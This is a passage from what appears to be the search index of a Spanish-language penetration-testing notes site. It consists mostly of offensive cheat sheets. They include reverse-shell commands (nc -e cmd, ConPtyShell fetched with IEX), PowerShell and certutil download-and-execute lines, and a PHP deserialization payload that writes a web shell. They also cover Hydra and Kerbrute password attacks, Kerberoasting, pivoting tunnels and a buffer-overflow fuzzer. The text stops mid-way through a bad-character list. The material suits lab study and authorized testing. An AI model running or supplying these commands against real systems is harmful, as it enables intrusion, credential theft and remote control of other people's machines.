<p>Soluci\u00f3n</p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#misc","title":"Misc","text":""},{"location":"CTFs/IPN%20Core%202022%20CTF/#bot-calculadora","title":"Bot Calculadora","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Acabamos de descubrir e implementar una caracter\u00edstica de Node.js del m\u00f3dulo vm y creamos una calculadora para usarlo, \u00e9chale un lente crack.  NOTA: \u00c9STE RETO TIENE PUNTAJE DIN\u00c1MICO,  MIENTRAS M\u00c1S PERSONAS LO RESUELVAN EL PUNTAJE IR\u00c1 DISMINUYENDO  https://t.me/node_vm_bot Archivos misc_bot_bot_calculadora.zip <p>Soluci\u00f3n</p>"},{"location":"Cheat%20Sheets/fuzzing/","title":"Fuzzing","text":"<p>Considerar diferencia de rutas respecto a archivos y directorios. No son lo mismo. - /cgi-bin - /cgi-bin/</p> <p>Considerar c\u00f3digos de estatus <code>500</code> como ruta existente aunque sea error de servidor.</p> <p>Considerar sintaxis de <code>fuzzer</code> para b\u00fasqueda recursiva. TODO: Buscar sintaxis de ffuf y a\u00f1adirlo a notas. Es decir: <code>http://sitio.com/FUZZ_padre/FUZZ_hijo</code></p> <p>Cuando se enumera un API tratar con el singular y el plural de la API considerando tambi\u00e9n los <code>ids</code> del endpoint. Por ejemplo: - <code>http://10.10.10.10/FUZZ</code> revela <code>http://10.10.10.10/flows</code> y <code>flows</code> revela algunos ids. - Considerar fuzzear <code>http://10.10.10.10/FUZZ/ID_encontrado</code>. - Buscar el singular <code>http://10.10.10.10/flow/ID_encontrado</code>.</p>"},{"location":"Cheat%20Sheets/fuzzing/#ffuf","title":"ffuf","text":""},{"location":"Cheat%20Sheets/fuzzing/#subdomain-discovery","title":"Subdomain Discovery","text":"<p><code>ffuf -c -w /path/to/vhost/wordlist -u https://target.com -H \"Host: FUZZ.target.com\" -ic</code></p>"},{"location":"Cheat%20Sheets/general/","title":"General","text":""},{"location":"Cheat%20Sheets/general/#utilidades","title":"Utilidades","text":""},{"location":"Cheat%20Sheets/general/#linux","title":"Linux","text":""},{"location":"Cheat%20Sheets/general/#treesh","title":"tree.sh","text":"<pre><code>#!/bin/bash\npwd=$(pwd)\necho Tree of: $pwd\nfind $pwd -print | sed -e \"s;$pwd;\\.;g;s;[^/]*\\/;|__;g;s;__|; |;g\"\n#very simple script. REALLY!\necho '|__end tree'\n</code></pre>"},{"location":"Cheat%20Sheets/general/#herramientas","title":"Herramientas","text":""},{"location":"Cheat%20Sheets/general/#hydra","title":"Hydra","text":"<pre><code>hydra -l &lt;USER&gt; -p &lt;PASSWORD&gt; &lt;IP_ADDRESS&gt; http-post-form \"&lt;LOGIN_PAGE&gt;:&lt;REQUEST_BODY&gt;:&lt;ERROR_MESSAGE&gt;\"\n</code></pre>"},{"location":"Cheat%20Sheets/general/#json-payload","title":"JSON Payload","text":"<pre><code>hydra -l \"root@dasith.works\" -P \"/usr/share/wordlists/rockyou.txt\" -s 3000 10.129.244.81 http-post-form \"/api/user/login:{\\\"email\\\"\\:\\\"^USER^\\\",\\\"password\\\"\\:\\\"^PASS^\\\"}:S=Password is wrong:H=content-type: application/json\"\n</code></pre>"},{"location":"Cheat%20Sheets/general/#tty","title":"TTY","text":""},{"location":"Cheat%20Sheets/general/#linux_1","title":"Linux","text":"<pre><code>ctrl + z\necho $TERM &amp;&amp; tput lines &amp;&amp; tput cols\n\n# bash\nstty raw -echo\nfg\n\n# zsh\nstty raw -echo; fg\n\nreset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty rows &lt;num&gt; columns &lt;cols&gt;\n</code></pre> <p>socat:</p> <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:1234\n</code></pre> <p>Int\u00e9rprete:</p> <pre><code>/usr/bin/script -qc /bin/bash /dev/null\n/bin/sh -i\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3 -c \"__import__('pty').spawn('/bin/bash')\"\npython3 -c \"__import__('subprocess').call(['/bin/bash'])\"\nperl -e 'exec \"/bin/sh\";'\nperl: exec \"/bin/sh\";\nperl -e 'print `/bin/bash`'\nruby: exec \"/bin/sh\"\nlua: os.execute('/bin/sh')\n\n# vi\n:!bash\n:set shell=/bin/bash:shell\n\n# nmap\n!sh\n\n# mysql\n! bash\n</code></pre>"},{"location":"Cheat%20Sheets/general/#windows","title":"Windows","text":"<p>ConPtyShell</p> <p>Server:</p> <pre><code># 1\nrlwrap nc -lvnp 3001\n\n# 2\nstty raw -echo; (stty size; cat) | nc -lvnp 3001\n</code></pre> <p>Cliente:</p> <pre><code>IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001\n</code></pre>"},{"location":"Cheat%20Sheets/general/#proxy-debugging","title":"Proxy debugging","text":"<p>TODO: Agregar comandos de shellhacks.com para redireccionar todo el tr\u00e1fico de la consola a burpsuite</p>"},{"location":"Cheat%20Sheets/inyecciones/","title":"Server-Side Template Injection","text":"<p>TODO</p>"},{"location":"Cheat%20Sheets/inyecciones/#php-object-injection","title":"PHP Object Injection","text":""},{"location":"Cheat%20Sheets/inyecciones/#codigo","title":"C\u00f3digo","text":"<pre><code>class foobarzoo {\n    public $csv=\"entries.csv\";\n    public $line=null;\n\n    function __destruct() {\n        file_put_contents($this-&gt;csv,$this-&gt;line);\n    }\n}\n</code></pre>"},{"location":"Cheat%20Sheets/inyecciones/#payload-de-explotacion","title":"Payload de explotaci\u00f3n","text":"<p><code>data=O:9:\"foobarzoo\":2:{s:3:\"csv\";s:8:\"evil.php\";s:4:\"line\";s:28:\"&lt;?php system($_GET[\"cmd\"])?&gt;\";}</code></p> <p>Donde en <code>O:9:\"foobarzoo\":2:</code>: - <code>O</code> \u2192 tipo de dato (objeto). - <code>0</code> \u2192 longitud dato. - <code>2</code> \u2192 cantidad de propiedades.</p> <p>Donde en <code>s:3:\"csv\";s:8:\"evil.php\"</code>: - <code>s</code> \u2192 tipo de dato (string). - <code>3</code> \u2192 longitud dato. - <code>csv</code> \u2192 nombre de propiedad. - <code>evil.php</code> \u2192 valor de propiedad.</p>"},{"location":"Cheat%20Sheets/inyecciones/#referencias","title":"Referencias","text":"<ul> <li>https://insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf</li> <li>https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</li> <li>https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/</li> <li>https://security.stackexchange.com/questions/176263/why-does-this-php-object-injection-exploit-work</li> <li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/628481cd4d9c9f7db980a6a92c446d22c26a4aad/Insecure%20Deserialization/PHP.md</li> </ul>"},{"location":"Cheat%20Sheets/inyecciones/#sql","title":"SQL","text":""},{"location":"Cheat%20Sheets/inyecciones/#sqlmap","title":"sqlmap","text":"<p>https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-(Login-Form-User).html</p>"},{"location":"Cheat%20Sheets/transfer/","title":"Transferencia de archivos","text":""},{"location":"Cheat%20Sheets/transfer/#linux","title":"Linux","text":"<p>Descarga recursiva de archivos en FTP:</p> <pre><code>wget -r --no-passive ftp://&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;/\n</code></pre>"},{"location":"Cheat%20Sheets/transfer/#windows","title":"Windows","text":"<pre><code>certutil.exe -f -urlcache -split http://10.10.14.9/nc.exe nc.exe\n\n# Ejecutar scripts en sesi\u00f3n\npowershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/nishang.ps1')\n\n# Descargar cualquier tipo de archivo\npowershell.exe Invoke-WebRequest -Uri http://10.10.14.9/nc.exe -OutFile nc.exe\n\n# Compartir archivos por smb y ejecutar sin necesidad de descargar\n## Escucha / Atacante\nimpacket-smbserver smbFolder $(pwd) -smb2support\n## Ejecuci\u00f3n / Victima\ncmd /c \\\\10.10.14.9\\smbFolder\\nc.exe -e cmd 10.10.14.9 1234\n</code></pre>"},{"location":"Cheat%20Sheets/windows/","title":"Windows","text":""},{"location":"Cheat%20Sheets/windows/#crackmapexec-pwn3d","title":"Crackmapexec <code>(Pwn3d!)</code>","text":"<p><code>cmd.exe /c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></p>"},{"location":"Cheat%20Sheets/windows/#powershell","title":"Powershell","text":""},{"location":"Cheat%20Sheets/windows/#bypass-de-execution-policy","title":"Bypass de execution policy","text":"<pre><code>powerShell.exe -ExecutionPolicy Bypass .\\script.ps1\n</code></pre> <p>Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/</p>"},{"location":"Cheat%20Sheets/windows/#invoke-command-providing-credentials","title":"Invoke command providing credentials","text":"<pre><code>$userName = 'WORKGROUP\\Hector'\n$userPassword = 'l33th4x0rhector'\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)\n# ComputerName obtenida de los comandos: \nhostname\n$env:COMPUTERNAME\n[Environment]::MachineName\n\n# Con o sin ComputerName en el caso de que sea local\nInvoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\\Windows\\Temp\\nc.exe -e cmd.exe 10.10.14.16 4321}\n\nStart-Process -FilePath 'powershell' -argumentlist \"IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')\" -Credential $credObject\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#ad-environment","title":"AD Environment","text":""},{"location":"Cheat%20Sheets/windows/#kerbrute","title":"Kerbrute","text":""},{"location":"Cheat%20Sheets/windows/#enumeracion-de-usuarios","title":"Enumeraci\u00f3n de usuarios","text":"<pre><code>./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#password-spraying","title":"Password Spraying","text":"<pre><code>sudo ntpdate 10.10.11.129\n./kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local users.txt Password123\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#as-rep-roasting","title":"AS-REP Roasting","text":""},{"location":"Cheat%20Sheets/windows/#impacket","title":"Impacket","text":"<pre><code>for user in $(cat users.txt); do impacket-GetNPUsers -dc-ip &lt;ip_de_dominio&gt; &lt;dominio&gt;/${user} -no-pass | grep -v Impacket; done\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#rubeus","title":"Rubeus","text":"<pre><code>.\\Rubeus.exe asreproast # \u00bfcomo admin? Ver si se necesitan credenciales\n## .\\Rubeus.exe asreproast /creduser:htb.local\\amanda /credpassword:Password123 # TODO Verificar\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#kerberoasting","title":"Kerberoasting","text":""},{"location":"Cheat%20Sheets/windows/#impacket_1","title":"Impacket","text":"<pre><code>impacket-GetUserSPNs {dominio/usuario:contrase\u00f1a} -dc-ip {ip de dominio} -request\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#rubeus_1","title":"Rubeus","text":"<pre><code>.\\Rubeus.exe kerberoast # Como Administrator\n.\\Rubeus.exe kerberoast /creduser:htb.local\\amanda /credpassword:Password123\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#bloodhound","title":"BloodHound","text":""},{"location":"Cheat%20Sheets/windows/#bloodhoundpy","title":"BloodHound.py","text":"<p>Nota: Al recopilar la info con la \u00faltima versi\u00f3n es recomendable usar a su vez tambi\u00e9n la \u00faltima versi\u00f3n del visualizador.</p>"},{"location":"Cheat%20Sheets/windows/#setup","title":"Setup","text":"<p>Repositorio Github</p> <pre><code>pyenv ...\ngit clone https://github.com/fox-it/BloodHound.py.git\ncd BloodHound.py\npython setup.py install\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#uso","title":"Uso","text":"<pre><code>python bloodhound.py -u hope.sharp -p 'Password123' -d search.htb -ns 10.10.11.129 -c All\n</code></pre>"},{"location":"Cheat%20Sheets/windows/#powerview","title":"PowerView","text":"Name Description Suggested Execution Get-Domain Returns a domain object for the current domain or the domain specified with <code>-Domain</code>. Useful information includes the domain name, the forest name and the domain controllers. <code>Get-Domain</code> Get-DomainController Returns the domain controllers for the current or specified domain. <code>Get-DomainController \\| select Forest, Name, OSVersion \\| fl</code> Get-ForestDomain Returns all domains for the current forest or the forest specified by <code>-Forest</code>. <code>Get-ForestDomain</code> Get-DomainPolicyData Returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller. Useful for finding information such as the domain password policy. <code>Get-DomainPolicyData \\| select -expand SystemAccess</code> Get-DomainUser Return all (or specific) user(s). To only return specific properties, use <code>-Properties</code>. By default, all user objects for the current domain are returned, use <code>-Identity</code> to return a specific user. <code>Get-DomainUser -Identity jking -Properties DisplayName, MemberOf \\| fl</code> Get-DomainComputer Return all computers or specific computer objects. <code>Get-DomainComputer -Properties DnsHostName \\| sort -Property DnsHostName</code> Get-DomainOU Search for all organization units (OUs) or specific OU objects. <code>Get-DomainOU -Properties Name \\| sort -Property Name</code> Get-DomainGroup Return all domain groups or specific domain group objects. <code>Get-DomainGroup \\| where Name -like \"*Admins*\" \\| select SamAccountName</code> Get-DomainGroupMember Return the members of a specific domain group. <code>Get-DomainGroupMember -Identity \"Domain Admins\" \\| select</code> Get-DomainGPO Return all Group Policy Objects (GPOs) or specific GPO objects. To enumerate all GPOs that are applied to a particular machine, use <code>-ComputerIdentity</code>. <code>Get-DomainGPO -Properties DisplayName \\| sort -Property DisplayName</code> Get-DomainGPOLocalGroup Returns all GPOs that modify local group membership through Restricted Groups or Group Policy Preferences. You can then manually find which OUs, and by extension which computers, these GPOs apply to. <code>Get-DomainGPOLocalGroup \\| select GPODisplayName, GroupName</code> Get-DomainGPOUserLocalGroupMapping Enumerates the machines where a specific domain user/group is a member of a specific local group. This is useful for finding where domain groups have local admin access, which is a more automated way to perform the manual cross-referencing described above. <code>Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators \\| select ObjectName, GPODisplayName, ContainerName, ComputerName \\| fl</code> Get-DomainTrust Return all domain trusts for the current or specified domain. <code>Get-DomainTrust</code>"},{"location":"Cheat%20Sheets/Network/general/","title":"General","text":""},{"location":"Cheat%20Sheets/Network/general/#host-discovery","title":"Host discovery","text":""},{"location":"Cheat%20Sheets/Network/general/#ping-sweep","title":"Ping Sweep","text":""},{"location":"Cheat%20Sheets/Network/general/#windows","title":"Windows","text":""},{"location":"Cheat%20Sheets/Network/general/#powershell","title":"Powershell","text":""},{"location":"Cheat%20Sheets/Network/general/#opcion-1","title":"Opci\u00f3n 1","text":"<pre><code># Ejecutar en l\u00edmea de comandos o como script\n1..255 | % {echo \"172.16.2.$_\"; ping -n 1 -w 100 172.16.2.$_} | Select-String ttl\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#opcion-2","title":"Opci\u00f3n 2","text":"<pre><code># Pendiente s\u00f3lo imprimir True\nImport-Module Microsoft.PowerShell.Management\n\n$ips = 1..255 | % { \"192.168.1.$_\" } \n\n$ips | ForEach-Object {\n\n   $result = Test-Connection -Count 1 -ComputerName $_ -Quiet\n   \"$($_) $result\"\n}\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#msdos","title":"MSDOS","text":"<pre><code>for /L %a in (1,1,254) do @start /b ping 192.168.0.%a -w 100 -n 2 &gt;nul\narp -a\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#linux","title":"Linux","text":""},{"location":"Cheat%20Sheets/Network/general/#bash","title":"Bash","text":""},{"location":"Cheat%20Sheets/Network/general/#opcion-1_1","title":"Opci\u00f3n 1","text":"<pre><code>fping -a -g X.X.X.0/24 2&gt;/dev/null # Opci\u00f3n 1\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#opcion-2_1","title":"Opci\u00f3n 2","text":"<pre><code>#!/bin/bash\n# host_discovery.sh\nsubnet=\"10.10.110.\"\nfor ip in {0..254}; do\n  timeout 1 bash -c \"ping -c 1 $subnet$ip\" &amp;&gt; /dev/null &amp;&amp; echo \"[+] Host found $subnet$ip\" &amp;\ndone; wait\n</code></pre> <p>Ejecuci\u00f3n:</p> <pre><code>bash host_discovery.sh\nbash host_discovery.sh 2&gt;/dev/null\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#opcion-3","title":"Opci\u00f3n 3","text":"<pre><code>subnet=\"10.10.110.\" &amp;&amp; for ip in {0..254}; do ping -c 1 -t 1 $subnet$ip  &gt; /dev/null &amp;&amp; echo \"[+] Host found $subnet$ip\"; done\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#nmap","title":"Nmap","text":"<pre><code>nmap -sL 10.10.110.0/24 # List Scan\nnmap -sP 10.10.110.0/24 # Ping Sweep\nnmap -PS 10.10.110.0/24 # TCP SYN Ping\nnmap -sA 10.10.110.0/24 # TCP ACK Ping\nnmap -PE 10.10.110.0/24 # ICMP Echo Ping\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#port-scanning","title":"Port scanning","text":""},{"location":"Cheat%20Sheets/Network/general/#tcp","title":"TCP","text":""},{"location":"Cheat%20Sheets/Network/general/#netcat","title":"Netcat","text":"<pre><code>netcat -v -z -n -w 1 &lt;ip&gt; 1-65535 &gt; host.nc 2&gt;&amp;1\ngrep -v \"refused\" host.nc\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#bash_1","title":"Bash","text":"<pre><code>host=&lt;ip&gt;\nfor port in {1..65535}; do\n  timeout 1 bash -c \"echo &gt;/dev/tcp/$host/$port\" &amp;&amp; echo \"port $port is open\" || echo \"port $port is closed\"\ndone\n</code></pre> <pre><code>host=&lt;ip&gt;\nfor port in {1..65535}; do\n  timeout 1 bash -c \"echo &gt;/dev/tcp/$host/$port\" 2&gt;/dev/null &amp;&amp; echo \"port $port is open\"\ndone\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#nmap-a-traves-de-pivote","title":"Nmap a trav\u00e9s de pivote","text":"<pre><code>seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n &lt;ip&gt; 2&gt;&amp;1 | grep \"tcp open\"\n</code></pre>"},{"location":"Cheat%20Sheets/Network/general/#mac-address","title":"MAC Address","text":""},{"location":"Cheat%20Sheets/Network/general/#cambio-de-mac-address","title":"Cambio de MAC Address","text":"<ol> <li>Deshabilitar interfaz</li> </ol> <pre><code>ifconfig &lt;interfaz de red&gt; down\nifconfig wlan0 down\n</code></pre> <ol> <li>Cambiar valor asignado</li> </ol> <pre><code>ifconfig &lt;interfaz de red&gt; hw ether # Cambiar la direcci\u00f3n f\u00edsica (hardware address hw ether)\nifconfig wlan0 hw ether 00:11:22:33:44:55\n</code></pre> <ol> <li>Habilitar interfaz</li> </ol> <pre><code>ifconfig &lt;interfaz de red&gt; up\nifconfig wlan0 up\n</code></pre> <p>Nota: Considerar que el cambio se realiza s\u00f3lo en memoria, no f\u00edsicamente por lo que regresar\u00e1 a su valor original una vez que se reinicie la m\u00e1quina. En algunas ocasiones y dependiendo del chipset que se est\u00e9 usando el valor regresar\u00e1 a su estado original sin necesidad de reiniciar la m\u00e1quina si se experimenta dicha situaci\u00f3n considerar buscar la soluci\u00f3n en: https://www.youtube.com/watch?v=7AUGQNBCddo</p>"},{"location":"Cheat%20Sheets/Network/pivoting/","title":"Pivoting &amp; Port Forwarding","text":""},{"location":"Cheat%20Sheets/Network/pivoting/#chisel","title":"Chisel","text":"<p>Cheet Sheet completa por 0xdf</p>"},{"location":"Cheat%20Sheets/Network/pivoting/#servidor","title":"Servidor","text":"<pre><code>chisel server -p 8000 --reverse\n</code></pre>"},{"location":"Cheat%20Sheets/Network/pivoting/#cliente","title":"Cliente","text":"Comando Descripci\u00f3n <code>chisel client 10.10.14.3:8000 R:80:127.0.0.1:80</code> Escuchar en Kali 80, redireccionar a localhost puerto 80 en el cliente <code>chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80</code> Escuchar en Kali 4444, redireccionar a 10.10.10.240 puerto 80 <code>chisel client 10.10.14.3:8000 R:socks</code> Crea un listener SOCKS5 en Kali (por default 1080), proxy a trav\u00e9s de cliente <code>chisel client 10.10.14.3:8000 R:1081:socks</code> Crea un listener SOCKS5 en 1081 en Kali, proxy a trav\u00e9s de cliente (configuraci\u00f3n \u00fatil para m\u00faltiples clientes)"},{"location":"Cheat%20Sheets/Network/pivoting/#proxychains","title":"Proxychains","text":"<p>Configuraci\u00f3n para m\u00faltiples clientes</p> <pre><code># ...\ndynamic_chain\n#strict_chain\n# ...\n[ProxyList]\nsocks5  127.0.0.1 1081\nsocks5  127.0.0.1 1080\n</code></pre>"},{"location":"Cheat%20Sheets/Network/pivoting/#ssh-proxychains","title":"SSH + Proxychains","text":""},{"location":"Cheat%20Sheets/Network/pivoting/#redireccion-local-de-puertos","title":"Redirecci\u00f3n local de puertos","text":"<pre><code># Sintaxis\nssh -N -L bind_address:port:host:host_port [username@address]\n\n# Setup\nsudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128\n\n# Uso\nsmbclient -L 127.0.0.1 -U Administrator\n</code></pre>"},{"location":"Cheat%20Sheets/Network/pivoting/#redireccion-remota-de-puertos","title":"Redirecci\u00f3n remota de puertos","text":"<pre><code># Sintaxis\nssh -N -R bind_address:port:host:host_port [username@address]\n\n# Setup\nsudo ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4\n\n# Uso\nTODO\n</code></pre>"},{"location":"Cheat%20Sheets/Network/pivoting/#redireccion-dinamica-de-puertos","title":"Redirecci\u00f3n din\u00e1mica de puertos","text":"<pre><code># Sintaxis\nssh -N -D address_to_bind_to:port_to_bind_to [username@server_address]\n\n# Setup\nsudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128\n# Edici\u00f3n de Proxychains /etc/proxychains.conf\n# [ProxyList]\n#\n#\n# socks5  127.0.0.1 8080\n\n## Uso\nproxychains nmap --top-ports=20 -sT -Pn 192.168.1.110\n</code></pre>"},{"location":"Cheat%20Sheets/Network/pivoting/#parametros-ssh","title":"Par\u00e1metros SSH","text":"<ul> <li><code>-N</code> No levantar\u00e1 prompt de comandos.</li> <li><code>-L</code> Indica redirecci\u00f3n local.</li> <li><code>-R</code> Indica redirecci\u00f3n remota.</li> <li><code>-D</code> Indica redirecci\u00f3n din\u00e1mica.</li> </ul>"},{"location":"Cheat%20Sheets/Network/pivoting/#socat","title":"Socat","text":""},{"location":"Cheat%20Sheets/Network/pivoting/#redireccion-local-de-puertos_1","title":"Redirecci\u00f3n local de puertos","text":"<pre><code># TCP\nsocat TCP-LISTEN:&lt;puerto_local&gt;,fork TCP:&lt;ip&gt;:&lt;puerto&gt;\n</code></pre>"},{"location":"Cheat%20Sheets/Network/pivoting/#windows-redireccion-redireccion-de-puertos","title":"Windows - Redirecci\u00f3n redirecci\u00f3n de puertos","text":"<pre><code># Requiere permisos de administrador\nnetsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport\n</code></pre>"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/","title":"OSCP BOF Cheat Sheet","text":"Fuzzing <code>msf-pattern_create -l &lt;longitud de bytes&gt;</code> Generaci\u00f3n de patr\u00f3n <code>!mona pattern_create &lt;longitud de bytes&gt;</code> Generaci\u00f3n de patr\u00f3n <code>msf-pattern_create -l &lt;EIP&gt;</code> Identificaci\u00f3n offset <code>!mona pattern_offset &lt;EIP&gt;</code> Identificaci\u00f3n offset"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/#fuzzerpy","title":"<code>fuzzer.py</code>","text":"<pre><code>#from pwn import *\nimport socket, sys, time\n\nif len(sys.argv) &lt; 2:\n   print \"\\n[!] Uso: python \" + sys.argv[0] + \"&lt;ip-address&gt; \" + \"&lt;remote-port&gt;\\n\"\n   sys.exit(0)\n\nip_address = sys.argv[1]\nrport = int(sys.argv[2])\n\nif __name__ == '__main__':\n   contador = 100\n   #p1 = log.progress(\"Data\") Log de datos en pwntools\n   while True:\n      #p1.status(f\"Enviando {contador} bytes.\") Log de datos en pwntools\n      print \"Enviando %s bytes.\" % contador\n      buffer = 'A' * contador\n      try:\n         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n         s.connect((ip_address, rport))\n\n         data = s.recv(1024)\n         s.send(\"%s\\r\\n\" % buffer)\n         data = s.recv(1024)\n         contador += 100\n         time.sleep(1)\n      except Exception as ex:\n         print \"\\n[!] Ha habido un error de conexion\\n\"\n         print ex\n         sys.exit(1)\n</code></pre>"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/#bad-chars","title":"Bad Chars","text":"Identificar Bad Chars <code>!mona bytearray -cpb '\\x00'</code> Generaci\u00f3n de bytearray con excepciones <code>!mona compare -f &lt;ubicacion de byte array .bin&gt; -a &lt;direcci\u00f3n de ESP&gt;</code> Comparaci\u00f3n de bytearray contra ESP"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/#coleccion-en-arreglo","title":"Colecci\u00f3n en arreglo","text":"<pre><code>badchars = (\n  \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n  \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n  \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n  \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n  \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n  \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n  \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n  \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n  \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n  \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n  \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n  \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n  \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n  \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n  \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n  \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n</code></pre>"},{"location":"Cheat%20Sheets/Pwning/bof-oscp/#coleccion-plana","title":"Colecci\u00f3n plana","text":"<p><code>\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\